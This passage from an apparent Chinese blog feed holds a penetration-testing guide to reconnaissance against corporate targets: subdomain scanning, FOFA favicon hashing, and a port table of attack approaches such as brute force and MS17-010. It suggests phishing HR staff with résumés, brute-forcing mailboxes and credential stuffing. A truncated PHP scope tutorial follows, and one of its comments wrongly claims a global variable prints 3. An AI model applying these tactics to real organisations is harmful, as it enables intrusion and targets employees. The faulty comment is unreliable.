title="批量扫描"></a>批量扫描</h2><ul><li><a href="https://gobies.org/">goby</a>扫C段（说不定就扫到命令执行了呢）</li><li><a href="https://nmap.org/">nmap</a>扫全端口</li><li>同IP网站查询其他域名：<a href="https://tools.ipip.net/ipdomain.php">https://tools.ipip.net/ipdomain.php</a></li></ul><h1 id="子域名搜集，目录扫描："><a href="#子域名搜集，目录扫描：" class="headerlink" title="子域名搜集，目录扫描："></a>子域名搜集，目录扫描：</h1><h2 id="子域名搜集"><a href="#子域名搜集" class="headerlink" title="子域名搜集"></a>子域名搜集</h2><p>通过以上的信息搜集，就会得到很多域名。子域名收集。推荐一个工具<a href="https://paper.seebug.org/1053/"><strong>OneForAll</strong></a></p><p><strong>能扫到多级目录，多，有标题</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 oneforall.py --target example.com --port&#x3D;80,443,8080,8009,7001 --valid&#x3D;True --path&#x3D;.&#x2F;subs.csv run</span><br><span class="line"></span><br><span class="line">--port&#x3D;PORT</span><br><span class="line">请求验证子域的端口范围(默认只探测80端口)</span><br><span class="line">--valid&#x3D;VALID</span><br><span class="line">只导出存活的子域结果(默认False)</span><br><span class="line">--path&#x3D;PATH</span><br><span class="line">结果保存路径(默认None)</span><br><span class="line">--takeover&#x3D;TAKEOVER</span><br><span class="line">检查子域接管(默认False)</span><br></pre></td></tr></table></figure><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>遇见、<a href="https://github.com/shack2/SWebScan">swebscan</a></p><p>访问域名404或者403的，权重高的直接批量扫目录（字典要强大，说不定就扫到源码了呢）</p><h1 id="拓展资产搜集"><a href="#拓展资产搜集" class="headerlink" title="拓展资产搜集"></a>拓展资产搜集</h1><h2 id="FOFA关键词搜集："><a href="#FOFA关键词搜集：" class="headerlink" title="FOFA关键词搜集："></a>FOFA关键词搜集：</h2><p>师傅这篇文章写的很详细了可以参考一下：<a href="https://mp.weixin.qq.com/s?__biz=MzU3MTU3NDk4Mw==&mid=2247484420&idx=1&sn=a18a908a0146b6fd08a9533520b9bc4b&chksm=fcdf5baccba8d2ba592cdeca87ded3b97915c5b0f557b18f7b6e152e4bc66d4141eddc105d5d&mpshare=1&scene=23&srcid=1104qlIdyYCsgUX58hjx7iAp&sharer_sharetime=1604499225727&sharer_shareid=1f9f9a5c0563a1d0ce3d7b29ade29fd3#rd">链接</a></p><h2 id="微信公众号搜集："><a href="#微信公众号搜集：" class="headerlink" title="微信公众号搜集："></a>微信公众号搜集：</h2><ul><li>很多集团的资产找不到的情况下，可以试一下微信搜公众号，或许会有不一样的发现</li><li>找其他技术文章也一样，一般精品文章都在微信</li></ul><h2 id="APP搜集："><a href="#APP搜集：" class="headerlink" title="APP搜集："></a>APP搜集：</h2><p>反编译APK并提取所有URL链接<a href="https://github.com/s0md3v/Diggy">Diggy</a>：</p><p><strong>注意：</strong></p><ul><li>需要在linux下使用</li><li>需要安装配置<a href="https://ibotpeaches.github.io/Apktool/install/">apktool</a></li></ul><h2 id="icon搜集："><a href="#icon搜集：" class="headerlink" title="icon搜集："></a>icon搜集：</h2><p>提取集团<code>icon</code>的<code>hash</code>然后<code>fofa</code>搜：</p><p><code>python</code>几行代码实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import mmh3</span><br><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line">response &#x3D; requests.get(url)</span><br><span class="line">favicon &#x3D; codecs.encode(response.content,&quot;base64&quot;)</span><br><span class="line">hash &#x3D; mmh3.hash(favicon)</span><br><span class="line">print(hash)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020110908.png" alt="image"></p><p><img src="https://qiniu.hzktester.top/tp2020110909.png" alt="image"></p><h2 id="供应链，网站指纹："><a href="#供应链，网站指纹：" class="headerlink" title="供应链，网站指纹："></a>供应链，网站指纹：</h2><ul><li>供应链<ul><li>网站底部可能会有技术支持的公司名称显示</li><li>F12找特征<code>FOFA</code>搜可能会找到开发此网站的公司，查该公司说不定会有演示网站或者测试站或者源码</li></ul></li><li>指纹识别：<a href="http://finger.tidesec.net/">潮汐指纹</a>、<a href="https://www.yunsee.cn/">云悉指纹</a></li></ul><h2 id="一些好用的谷歌插件："><a href="#一些好用的谷歌插件：" class="headerlink" title="一些好用的谷歌插件："></a>一些好用的谷歌插件：</h2><ul><li><p><code>wappalyzer</code>：查看网站使用了哪些技术,配合上<code>FOFA</code>就可以更快熟悉目标。</p><p>  <img src="https://qiniu.hzktester.top/tp2020110901.png" alt="image"></p></li><li><p><code>FOFA Pro View</code>：查看网站IP,以及开放的端口，同IP网站等</p><p>  <img src="https://qiniu.hzktester.top/tp2020110902.png" alt="image"></p></li><li><p><code>EditThisCookie</code>：可以很方便修改已保存的<code>cookie</code></p><p>  <img src="https://qiniu.hzktester.top/tp2020110903.png" alt="image"></p></li><li><p><code>User-Agent</code>：可以快速修改请求ua(某些url只能用手机访问)</p><p>  <img src="https://qiniu.hzktester.top/tp2020110904.png" alt="image"></p></li><li><p><code>X-Forwarded-For Header</code>：可以很方便的在请求里面加<code>X-Forwarded-For</code>头</p><p>  <img src="https://qiniu.hzktester.top/tp2020110905.png" alt="image"></p></li><li><p><code>JSONView</code>：美化<code>json</code>,方便浏览(无图脑补)</p></li><li><p><code>HackBar</code>：这个不用介绍，手艺人必备。</p></li></ul><h2 id="社工搜集："><a href="#社工搜集：" class="headerlink" title="社工搜集："></a>社工搜集：</h2><p>这里没研究过，提供一个思路：</p><ul><li><p>网盘搜关键词找是否有泄露的敏感文件（有些员工分享文件可能会用这个）：<a href="https://www.lingfengyun.com/">凌风云网盘</a></p><p>  <img src="https://qiniu.hzktester.top/tp2020110910.png" alt="image"></p></li><li><p>写脚本爬各招聘网站HR的邮箱然后发简历钓鱼</p></li><li><p>已知集团邮箱后缀，全拼姓名TOP500字典爆破验证存活的邮箱然后针对发邮件（最笨的法子了）：<a href="https://verify-email.org/">链接</a></p></li><li><p>针对某个员工生成字典撞库<a href="https://www.shentoushi.top/tools/dict/index.php">密码字典生成器</a></p></li></ul><h1 id="漏洞文库："><a href="#漏洞文库：" class="headerlink" title="漏洞文库："></a>漏洞文库：</h1><ul><li>零组文库：<a href="http://47.94.96.209/index.html">零组</a></li><li>乌云镜像：<a href="https://wooyun.x10sec.org/">https://wooyun.x10sec.org/</a></li></ul><h1 id="常见端口渗透思路："><a href="#常见端口渗透思路：" class="headerlink" title="常见端口渗透思路："></a>常见端口渗透思路：</h1><table><thead><tr><th>端口号</th><th>端口说明</th><th>渗透思路</th></tr></thead><tbody><tr><td>21/69</td><td>FTP/TFTP：文件传输协议</td><td>爆破、内网嗅探</td></tr><tr><td>22</td><td>SSH：远程连接</td><td>用户名枚举、爆破</td></tr><tr><td>23</td><td>Telnet：远程连接</td><td>爆破、内网嗅探</td></tr><tr><td>25</td><td>SMTP：邮件服务</td><td>邮件伪造</td></tr><tr><td>53</td><td>DNS：域名系统</td><td>DNS域传送\DNS缓存投毒\DNS欺骗\利用DNS隧道技术刺透防火墙</td></tr><tr><td>389</td><td>LDAP</td><td>未授权访问（通过LdapBrowser工具直接连入）</td></tr><tr><td>443</td><td>https服务</td><td>OpenSSL 心脏滴血（nmap -sV –script=ssl-heartbleed ）</td></tr><tr><td>445</td><td>SMB服务</td><td>ms17_010远程代码执行</td></tr><tr><td>873</td><td>rsync服务</td><td>未授权访问</td></tr><tr><td>1090/1099</td><td>Java-rmi</td><td>JAVA反序列化远程命令执行漏洞</td></tr><tr><td>1352</td><td>Lotus Domino邮件服务</td><td>爆破：弱口令、信息泄漏：源代码</td></tr><tr><td>1433</td><td>MSSQL</td><td>注入、SA弱口令爆破、提权</td></tr><tr><td>1521</td><td>Oracle</td><td>注入、TNS爆破</td></tr><tr><td>2049</td><td>NFS</td><td>配置不当</td></tr><tr><td>2181</td><td>ZooKeeper服务</td><td>未授权访问</td></tr><tr><td>3306</td><td>MySQL</td><td>注入、爆破、写shell、提权</td></tr><tr><td>3389</td><td>RDP</td><td>爆破、Shift后门、CVE-2019-0708远程代码执行</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>爆破：控制台弱口令、认证绕过</td></tr><tr><td>5000</td><td>Sybase/DB2数据库</td><td>爆破、注入</td></tr><tr><td>5432</td><td>PostgreSQL</td><td>爆破弱口令、高权限执行系统命令</td></tr><tr><td>5632</td><td>PcAnywhere服务</td><td>爆破弱口令</td></tr><tr><td>5900</td><td>VNC</td><td>爆破：弱口令、认证绕过</td></tr><tr><td>6379</td><td>Redis</td><td>未授权访问、爆破弱口令</td></tr><tr><td>7001</td><td>WebLogic中间件</td><td>反序列化、控制台弱口令+部署war包、SSRF</td></tr><tr><td>8000</td><td>jdwp</td><td>JDWP 远程命令执行漏洞（<a href="https://github.com/IOActive/jdwp-shellifier">工具</a>）</td></tr><tr><td>8080/8089</td><td>Tomcat/JBoss/Resin/Jetty/Jenkins</td><td>反序列化、控制台弱口令、未授权</td></tr><tr><td>8161</td><td>ActiveMQ</td><td>admin/admin、任意文件写入、反序列化</td></tr><tr><td>8069</td><td>Zabbix</td><td>远程命令执行</td></tr><tr><td>9043</td><td>WebSphere控制台</td><td>控制台弱口令https://:9043/ibm/console/logon.jsp、远程代码执行</td></tr><tr><td>9200/9300</td><td>Elasticsearch服务</td><td>远程代码执行</td></tr><tr><td>11211</td><td>Memcache</td><td>未授权访问（nc -vv 11211）</td></tr><tr><td>27017</td><td>MongoDB</td><td>未授权访问、爆破弱口令</td></tr><tr><td>50000</td><td>SAP</td><td>远程代码执行</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权访问</td></tr></tbody></table><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>信息收集是一个看似琐碎但不可或缺的步骤，在网络攻击和防御的成本都越来越低的当下，信息差往往是决定成败的关键。只有找到更多的资产暴露攻击面，才能找到别人发现不了的漏洞。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;当有一个很大的集团目标时，一般的信息搜集流程如下：&lt;/p&gt;
&lt;h1 id=&quot;集团结构：&quot;&gt;&lt;a href=&quot;#集团结构：&quot; class=&quot;headerlink&quot; title=&quot;集团结构：&quot;&gt;&lt;/a&gt;集团结构：&lt;/h1&gt;&lt;p&gt;主要提取出历史网站备案，域名、子公司域名、备案号、注册邮箱（邮箱@后的也可能是域名）、手机号。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;天眼查：&lt;a href=&quot;https://www.tianyancha.com/&quot;&gt;https://www.tianyancha.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;爱企查：&lt;a href=&quot;https://aiqicha.baidu.com/&quot;&gt;https://aiqicha.baidu.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;企查查：&lt;a href=&quot;https://www.qcc.com/&quot;&gt;https://www.qcc.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;备案号查同备案的网站&quot;&gt;&lt;a href=&quot;#备案号查同备案的网站&quot; class=&quot;headerlink&quot; title=&quot;备案号查同备案的网站&quot;&gt;&lt;/a&gt;备案号查同备案的网站&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://beian.miit.gov.cn/#/Integrated/recordQuery&quot;&gt;https://beian.miit.gov.cn/#/Integrated/recordQuery&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;  &lt;img src=&quot;https://qiniu.hzktester.top/tp2020110906.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;主域名中的跳转链接、JS中的链接搜集&quot;&gt;&lt;a href=&quot;#主域名中的跳转链接、JS中的链接搜集&quot; class=&quot;headerlink&quot; title=&quot;主域名中的跳转链接、JS中的链接搜集&quot;&gt;&lt;/a&gt;主域名中的跳转链接、JS中的链接搜集&lt;/h2&gt;&lt;p&gt;集团结构信息搜集后一般会得到主域名，也就是官网信息，可能有很多跳转链接，也属于他的资产，包括JS中的链接。推荐使用这个工具进行提取：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;jsfinder（扫API和子域名）：&lt;a href=&quot;https://github.com/Threezh1/JSFinder&quot;&gt;https://github.com/Threezh1/JSFinder&lt;/a&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python JSFinder.py -u http:&amp;#x2F;&amp;#x2F;www.baidu.com -d -ou mi_url.txt -os mi_subdomain.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;深挖更多IP资产：&quot;&gt;&lt;a href=&quot;#深挖更多IP资产：&quot; class=&quot;headerlink&quot; title=&quot;深挖更多IP资产：&quot;&gt;&lt;/a&gt;深挖更多IP资产：&lt;/h1&gt;</summary>
    
    
    
    <category term="Web渗透" scheme="https://hzktester.top/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="信息搜集" scheme="https://hzktester.top/tags/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>函数的用法及封装、变量范围</title>
    <link href="https://hzktester.top/posts/e7ac7642.html"/>
    <id>https://hzktester.top/posts/e7ac7642.html</id>
    <published>2020-10-21T09:57:00.000Z</published>
    <updated>2020-10-21T09:58:44.173Z</updated>
    
    <content type="html"><![CDATA[<h2 id="函数的定义"><a href="#函数的定义" class="headerlink" title="函数的定义"></a>函数的定义</h2><p>函数<code>function</code>是一段完成指定任务的已命名代码块。函数可以遵照给它的一组值或参数完成特定的任务，并且可能返回一个值。在<code>PHP</code>中有两种函数：<strong>自定义函数与系统函数</strong>。</p><p>函数的优点：</p><ul><li><strong>控制程序设计的复杂性</strong></li><li><strong>提高软件的可靠性</strong></li><li><strong>提高软件的开发效率</strong></li><li><strong>提高软件的可维护性</strong></li><li><strong>提高程序的重用性</strong></li></ul><h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><h3 id="自定义函数语法格式："><a href="#自定义函数语法格式：" class="headerlink" title="自定义函数语法格式："></a>自定义函数语法格式：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function  函数名称([参数1 [,参数2 [,…]]])&#123;</span><br><span class="line">程序内容叙述(也叫函数体);</span><br><span class="line">[return 返回值;] &#x2F;&#x2F;如需函数有返回值时使用</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="函数的使用："><a href="#函数的使用：" class="headerlink" title="函数的使用："></a>函数的使用：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名称([参数1 [,参数2 [,…]]]);</span><br></pre></td></tr></table></figure><h3 id="自定义函数的名称："><a href="#自定义函数的名称：" class="headerlink" title="自定义函数的名称："></a>自定义函数的名称：</h3><p>它是函数在程序代码中的识别名称，函数名可以是以字母或下划线开头后跟零个或多个字母、下划线和数字的任何字符串。函数名不区分大小写。命名函数时不可使用已声明的函数，或PHP内建的函数名称。</p><h3 id="参数："><a href="#参数：" class="headerlink" title="参数："></a>参数：</h3><p>所谓的参数就是用来把数值由函数外部传入函数体中，并用来加以运算处理。参数之间用“ ，”号隔开。当函数不需要任何数值传入时，可以省略参数。</p><h3 id="返回值："><a href="#返回值：" class="headerlink" title="返回值："></a>返回值：</h3><p>当调用函数时需要它返回一些数值，那么就要函数体中用<code>return</code>语句实现。格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">return  返回值；    &#x2F;&#x2F;返回值也可以是一个表达式</span><br><span class="line">exit();          &#x2F;&#x2F;无返回值 void</span><br></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;用函数求累加：&lt;br&gt;&quot;;</span><br><span class="line">    function test($a)</span><br><span class="line">    &#123;   </span><br><span class="line">        $sum&#x3D;0;</span><br><span class="line">        for($i&#x3D;0;$i&lt;&#x3D;$a;$i++)</span><br><span class="line">            $sum+&#x3D;$i;</span><br><span class="line">        return $sum;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &quot;50的累加是：&quot;.test(50).&quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;100的累加是：&quot;.test(100).&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="判断函数是否存在"><a href="#判断函数是否存在" class="headerlink" title="判断函数是否存在"></a>判断函数是否存在</h2><p><code>function_exists()</code> - - 判断函数是否存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(function_exists(&#39;mkdir&#39;));</span><br><span class="line">&#x2F;&#x2F;判断系统函数mkdir是否存在，输出bool(true)</span><br></pre></td></tr></table></figure><h2 id="PHP变量的范围"><a href="#PHP变量的范围" class="headerlink" title="PHP变量的范围"></a>PHP变量的范围</h2><p>变量的范围意指变量在程序中的可作用范围。当一个变量执行赋值动作后，会随着声明局部的差异，而有不同的作用范围。大致上来说变量会依据声明的局部分为下列两种：<strong>局部变量和全局变量</strong></p><h3 id="局部变量-内部变量"><a href="#局部变量-内部变量" class="headerlink" title="局部变量(内部变量)"></a>局部变量(内部变量)</h3><p>在函数之中声明的变量就是局部变量，并且该变量只有在函数范围之中才能加以使用。如果其它程序局部需要调用使用该变量值时，必须通过<code>return</code>指令，来将其传回至主程序区块以作后续处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$a&#x3D;0;</span><br><span class="line">function print_A()&#123; </span><br><span class="line">    $a &#x3D; 3;&#x2F;&#x2F;定义局部变量</span><br><span class="line">    echo &quot;在函数中显示局部变量 a 值: $a &lt;p&gt;&quot;;  &#x2F;&#x2F;输出a的值是3</span><br><span class="line">    return $a; </span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; print_A();</span><br><span class="line">echo &quot;在函数外显示局部变量 b 值: $b &lt;br&gt;&quot;;     &#x2F;&#x2F;输出a的值是3</span><br><span class="line">echo $a;       &#x2F;&#x2F;输出a的值是3</span><br></pre></td></tr></table></figure><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><ul><li><strong>在函数范围之外所声明的变量就是全局变量</strong>。由于函数可以视为单独的程序片段，所以局部变量会复盖全局变量的能见度，因此<strong>在函数中并无法直接调用使用全局变量</strong>。</li><li>函数中若要使用全局变量时，必须要利用<code>global</code>关键字定义目标变量，以告诉函数主体此变量为全局。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; 5;</span><br><span class="line">function print_A()&#123; </span><br><span class="line">    global $a;</span><br><span class="line">    $a &#x3D; 10;</span><br><span class="line">    echo &quot;在函数中显示全局变量 a 值: $a &lt;p&gt;&quot;;  &#x2F;&#x2F;输出a的值是10</span><br><span class="line">    return $a; </span><br><span class="line">&#125;</span><br><span class="line">$b &#x3D; print_A();</span><br><span class="line">echo &quot;在函数外显示全局变量 b 值: $b &lt;br&gt;&quot;;     &#x2F;&#x2F;输出a的值是10</span><br><span class="line">echo $a;        &#x2F;&#x2F;输出a的值是10</span><br></pre></td></tr></table></figure></li><li>也可以使用预定义的全局变量数组<code>$GLOBALS</code>.这是一个特殊变量在程序运行时自动创建。格式：<code>echo $GLOBALS[&quot;变量名&quot;];</code>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; 5;</span><br><span class="line">echo $GLOBALS[&quot;a&quot;];     &#x2F;&#x2F;输出5</span><br></pre></td></tr></table></figure></li></ul><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul><li>在函数中声明全局变量时，其名字要与全局变量一致<br>通过<code>unset($var)</code>可以手动删除变量，变量会在内存中被释放，也就不在全局作用域中了。</li><li>使用<code>require</code>与<code>include</code>包含不会影响作用域</li><li>通过参数列表传递给函数的变量，对于函数来说是局部变量，除非在传递时带有<code>&amp;</code>引用符号</li></ul><h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p><code>PHP</code>支持声明函数变量为静态的<code>static</code>。一个静态变量在所有对该函数的调用之间共享，并且仅在脚本的执行期间函数第一次被调用时被初始化。要声明函数变量为静态的用关键字<code>static</code>。通常，静态变量的第一次使用时赋予一个初始值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function test() &#123;</span><br><span class="line">static $a &#x3D; 0;    &#x2F;&#x2F;声明静态变量a的初始值为0</span><br><span class="line">echo $a;          &#x2F;&#x2F;输出a的值</span><br><span class="line">$a++;             &#x2F;&#x2F;每次调用函数后a的值+1</span><br><span class="line">&#125;</span><br><span class="line">test();        &#x2F;&#x2F;调用第一次输出a的值为0</span><br><span class="line">test();        &#x2F;&#x2F;调用第二次输出a的值为1</span><br><span class="line">test();        &#x2F;&#x2F;调用第三次输出a的值为2</span><br><span class="line">test();        &#x2F;&#x2F;调用第四次输出a的值为3</span><br><span class="line">test();        &#x2F;&#x2F;调用第五次输出a的值为4</span><br></pre></td></tr></table></figure><h2 id="声明及应用各种形式的PHP函数"><a href="#声明及应用各种形式的PHP函数" class="headerlink" title="声明及应用各种形式的PHP函数"></a>声明及应用各种形式的PHP函数</h2><h3 id="常规参数的函数"><a href="#常规参数的函数" class="headerlink" title="常规参数的函数"></a>常规参数的函数</h3><ul><li>函数的<strong>实参和形参应该个数相等、类型一致</strong>。</li><li>调用时传递的参数<strong>个数和顺序必须一致</strong>。</li></ul><h4 id="chr"><a href="#chr" class="headerlink" title="chr()"></a>chr()</h4><p>传递进去<code>ascii</code>码,返回对应的<code>ascii</code>值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(chr(65));      &#x2F;&#x2F;输出string(1) &quot;A&quot;</span><br></pre></td></tr></table></figure><h4 id="ceil"><a href="#ceil" class="headerlink" title="ceil()"></a>ceil()</h4><p>进一法取整，返回<code>float</code>类型整数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(ceil(5.44411111)); &#x2F;&#x2F;输出float(6)</span><br></pre></td></tr></table></figure><h4 id="array-combine"><a href="#array-combine" class="headerlink" title="array_combine()"></a>array_combine()</h4><p>合并一个数组,第一个传参<code>key</code>值，第二个传参<code>value</code>值，返回一个数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$info &#x3D; array(&#39;1&#39;,&#39;2&#39;,&#39;3&#39;);</span><br><span class="line">$info2 &#x3D; array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);</span><br><span class="line">var_dump(array_combine($info,$info2));  </span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020102108.png" alt="image"></p><h4 id="implode"><a href="#implode" class="headerlink" title="implode()"></a>implode()</h4><p>合并数组并且用符号隔开返回<code>string</code>类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(implode(&quot;,&quot;,[&#39;key&#39;,&#39;key1&#39;,&#39;key2&#39;]));   &#x2F;&#x2F;输出string(13) &quot;key,key1,key2&quot;</span><br></pre></td></tr></table></figure><h3 id="引用参数的函数"><a href="#引用参数的函数" class="headerlink" title="引用参数的函数"></a>引用参数的函数</h3><ul><li>相对于按值传递模式，并不会将父程序中的指定数值或目标变量传递给函数，而是把该数值或变量的内存储存区块相对地址导入函数之中。因此当该<strong>数值在函数中有任何变动时，会连带对父程序造成影响</strong>。</li><li>如果在函数的形参中使用<code>&amp;</code>修饰的参数，在调用该函数时必须传入一个变量给这个参数，而是不能传递一个值。</li></ul><h4 id="使用常规参数传值，类似于局部变量"><a href="#使用常规参数传值，类似于局部变量" class="headerlink" title="使用常规参数传值，类似于局部变量"></a>使用常规参数传值，类似于局部变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function test($arg) &#123;         </span><br><span class="line">    $arg &#x3D; 200;  &#x2F;&#x2F;在函数中改变参数$a的值为200</span><br><span class="line">&#125;</span><br><span class="line">$var &#x3D; 100;      &#x2F;&#x2F;在父程序中声明一个全局变量$var，初值为100</span><br><span class="line">test($var);      &#x2F;&#x2F;调用test函数，并将变量$var的值100传给函数的参数$arg</span><br><span class="line">echo $var;       &#x2F;&#x2F;输出100。$var的值没有变化</span><br></pre></td></tr></table></figure><h4 id="使用“-amp-”引用参数传值，类似于全局变量"><a href="#使用“-amp-”引用参数传值，类似于全局变量" class="headerlink" title="使用“&amp;”引用参数传值，类似于全局变量"></a>使用“&amp;”引用参数传值，类似于全局变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function test( &amp;$arg ) &#123;        </span><br><span class="line">    $arg &#x3D; 200;   &#x2F;&#x2F;改变参数$a的值为200,$arg是引用参数，外部变量$var也被修改</span><br><span class="line">&#125;</span><br><span class="line">$var &#x3D; 100;       &#x2F;&#x2F;在父程序中声明一个全局变量$var，初值为100</span><br><span class="line">test($var);         &#x2F;&#x2F;调用test函数，并将变量$var的引用传给函数的参数$arg</span><br><span class="line">echo $var;        &#x2F;&#x2F;输出200。$var的值在函数中修改变量$arg时被修改</span><br></pre></td></tr></table></figure><h3 id="默认参数的函数"><a href="#默认参数的函数" class="headerlink" title="默认参数的函数"></a>默认参数的函数</h3><ul><li>在<code>php</code>中，支持函数的默认方式调用。<strong>如果在调用函数时没有指定参数的值，在函数中会使用参数的默认值</strong>。 </li><li>默认参数必须列在所有没有默认值参数的后面。</li></ul><h4 id="有默认参数的函数"><a href="#有默认参数的函数" class="headerlink" title="有默认参数的函数"></a>有默认参数的函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function test($name &#x3D; &#39;张三&#39;, $sex &#x3D; &quot;男&quot;, $age &#x3D; &quot;18&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;我的名字叫：&quot;.$name.&quot; 性别：&quot;.$sex. &quot; 年龄：&quot;.$age.&quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">test();    &#x2F;&#x2F;输出我的名字叫：张三 性别：男 年龄：18</span><br><span class="line">test(&quot;李四&quot;);    &#x2F;&#x2F;输出我的名字叫：李四 性别：男 年龄：18</span><br><span class="line">test(&quot;王麻子&quot;,&quot;女&quot;);&#x2F;&#x2F;输出我的名字叫：王麻子 性别：女 年龄：18</span><br><span class="line">test(&quot;王麻子2&quot;,&quot;女&quot;,&quot;16&quot;); &#x2F;&#x2F;我的名字叫：王麻子2 性别：女 年龄：16</span><br></pre></td></tr></table></figure><h4 